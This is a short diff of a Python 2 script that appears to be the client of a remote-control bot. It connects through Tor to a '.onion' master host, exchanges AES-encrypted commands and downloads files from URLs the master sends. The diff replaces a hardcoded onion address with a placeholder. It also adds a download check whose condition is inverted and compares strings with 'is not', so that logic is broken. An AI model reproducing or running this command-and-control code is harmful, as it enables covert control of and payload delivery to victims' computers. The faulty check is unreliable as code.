@@ -147,7 +147,7 @@ port = 5555
 size = 4096
 sock = socks.socksocket()
 sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
-host = "3pnzzdpq7aj6s6b6.onion"
+host = "MasterAddressHere.onion"
 sock.connect((host,port))
 iv = RecvIV()
 cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -161,7 +161,10 @@ while 1:
 	if data1.startswith("download"):
 		SendTextCipher(name + " :: " + data1)
 		dataUrl = RecvTextCipher()
-		URL(dataUrl)
+		if dataUrl is not "no-file":
+			print "Error! No File Found!"
+		else:
+			URL(dataUrl)
 	else:
 		SendTextCipher(name + " :: " + data1)
 		data = RecvTextCipher()
